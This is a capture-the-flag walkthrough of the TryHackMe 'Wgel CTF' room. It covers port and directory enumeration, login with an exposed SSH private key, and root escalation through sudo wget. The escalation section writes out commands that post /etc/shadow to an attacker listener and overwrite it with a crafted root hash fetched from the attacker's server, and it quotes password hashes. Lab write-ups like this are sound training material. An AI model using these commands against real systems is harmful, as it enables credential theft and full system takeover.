@@ -1,0 +1,192 @@
+		██     ██  ██████  ███████ ██           ██████ ████████ ███████ 
+		██     ██ ██       ██      ██          ██         ██    ██      
+		██  █  ██ ██   ███ █████   ██          ██         ██    █████   
+		██ ███ ██ ██    ██ ██      ██          ██         ██    ██      
+		 ███ ███   ██████  ███████ ███████      ██████    ██    ██
+			   
+			    Can you exfiltrate the root flag?
+
+https://tryhackme.com/room/wgelctf
+
+--[Intro]--
+
+"Have fun with this easy box."
+
+--[Basic Enumeration]--
+
+To start off this box were going to do a basic nmap, nikto and gobuster combination. Once we've
+enumerated the ports, services running on those ports, files, paths and directories and found potentially
+low hanging fruits with nikto we'll move onto some manual poking around to see what we can find on the target
+in our browser.
+
+--[Nmap]--
+
+Analyzing our nmap output we get a very basic web server running on port 80 and SSH running on port 22.
+Some initial thoughts I have is to run a hydra SSH bruteforce on SSH but so far we don't have any usernames.
+After having just completed another THM room https://tryhackme.com/room/easypeasyctf I noticed that a flag
+was on the default apache page so upon visiting the IP on port 80 and viewing the default page source we find
+a comment:
+
+" <!-- Jessie don't forget to udate the webiste -->"
+
+This is of course not standard on the apache default page so we note this down as a potential username and we make a
+user.txt file and put "Jessie" and "jessie" and try to bruteforce the SSH with hydra. After 10mins has passed we
+still don't get a hit so we stop the bruteforce and carry on enumerating the box.
+
+nmap -sC -sV -A 10.10.132.152
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
+|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
+|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+
+--[GoBuster]--
+
+Using GoBuster were going to see if there are any paths we can take to further explore this box. Upon visiting
+the IP address in our browser all we get is a default apache2 ubuntu page which might not be enough so
+we fire off GoBuster to see if we can find anything to further explore.
+
+gobuster dir -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.132.152/ -t 6
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.132.152/
+[+] Method:                  GET
+[+] Threads:                 6
+[+] Wordlist:                /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/08/07 20:13:43 Starting gobuster in directory enumeration mode
+===============================================================
+/sitemap              (Status: 301) [Size: 316] [--> http://10.10.132.152/sitemap/]
+
+The only path we can take thus far is visiting /sitemap, upon visiting we get a Unapp web page where the
+page looks very generic nothing unique or special about it, after some quick page source inspection we
+find nothing of interest so we take a look at our nikto output that we ran in the background whilst poking
+around.
+
+--[Nikto]--
+
+Nikto is great at finding low hanging fruits and common misconfigurations. We fire it off in the background
+whilst we do other things and we return every now and then to check the output.
+
+After coming back to our first nikto scan we only used the IP of the box and we didn't include /sitemap that
+GoBuster found so we do a second nikto scan this time appending /sitemap and try again.
+
+nikto -h http://10.10.132.152/sitemap
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.132.152
++ Target Hostname:    10.10.132.152
++ Target Port:        80
++ Start Time:         2022-08-07 20:19:36 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
++ Server may leak inodes via ETags, header found with file /sitemap/, inode: 5258, size: 56c0f8dbf7f80, mtime: gzip
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /sitemap/css/: Directory indexing found.
++ OSVDB-3092: /sitemap/css/: This might be interesting...
++ OSVDB-3268: /sitemap/images/: Directory indexing found.
++ OSVDB-6694: /sitemap/.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
++ OSVDB-3093: /sitemap/.ssh/id_rsa: A user's home directory may be set to the web root, an ssh file was retrieved. This should not be accessible via the web.
++ 7889 requests: 0 error(s) and 12 item(s) reported on remote host
++ End Time:           2022-08-07 20:23:05 (GMT1) (209 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+After our second nikto scan we see '/sitemap/.ssh/id_rsa'. id_rsa is an SSH private key and if not password
+protected then we could simply 'chmod 600 id_rsa' and 'ssh -i id_rsa jessie@10.10.132.152' and login. However
+we cant be sure so we verify this by using ssh2john.
+
+Running ssh2john on the newly discovered id_rsa private key.
+
+ssh2john id_rsa > id_rsa_results.john
+id_rsa has no password!
+
+Great this confirms that the key is not password protected. Now we try to ssh in with the user Jessie.
+Using Jessie we get a prompt to enter a password but of course we just verified that we don't need credentials
+for the key so we try jessie (lower case j) and try again.
+
+ssh -i id_rsa jessie@10.10.132.152
+
+We get in successfully!
+
+jessie@CorpOne:~$ id
+uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+
+We navigate to /home, then the user jessie directory and then 'ls -la *' and find the flag located in the Documents directory.
+
+Now we root. Using the standard 'sudo -l' we get the following:
+
+jessie@CorpOne:~$ sudo -l
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+    
+This means that wget can be ran as root so we visit gtfobins [1] to learn more.
+
+[1] https://gtfobins.github.io/gtfobins/wget/
+
+I also did some more research finding other ways to escalate our privileges with wget and find [2].
+
+[2] https://vk9-sec.com/wget-privilege-escalation/
+
+Using [2] we successfully escalate to the root user and retrieve the root flag.
+
+--[Root]--
+
+Using [2] we see that we can overwrite the /etc/shadow file, meaning we can create our own root password
+and become the root user by means of simply changing the password hash.
+
+To do this we do the following:
+
+Host: nc -lvnp 80
+Target: sudo /usr/bin/wget --post-file=/etc/shadow 10.11.52.160
+
+This lets us read the /etc/shadow file which isn't available to us using our current user jessie. As can be seen:
+
+jessie@CorpOne:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+
+Now we need to create our own password hash, put it into the new shadow file and overwrite the current one on the target.
+Since we are able to read the /etc/shadow file we do the above to output the contents and save it to a local file and then
+send the new shadow file back to the target to overwrite the current shadow file.
+
+Lets replace the root password with our new one.
+
+Old: root:$y$j9T$plVQ398.VrZWiX7HdZ0Dk1$BVDbSdcoIN2hJeURAg/ZaWwtjfX4CM8fBcwFPfL2229:19211:0:99999:7:::
+New: root:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:14146:::::: = cooldude! [2]
+
+To do this we do the following:
+
+Host the new shadow file: python -m http.server (same dir as file)
+Overwrite /etc/shadow: sudo wget http://10.11.52.160:8000/shadow -O /etc/shadow
+
+We can repeat the above to read /etc/shadow again to confirm that we have overwritten the file and now
+we simply 'su root' and enter in the new password and we're now root!
+
+root@CorpOne:/home/jessie# id
+uid=0(root) gid=0(root) groups=0(root)
+
+Navigate to /root to retrieve the second and final flag.
+
+=Adam
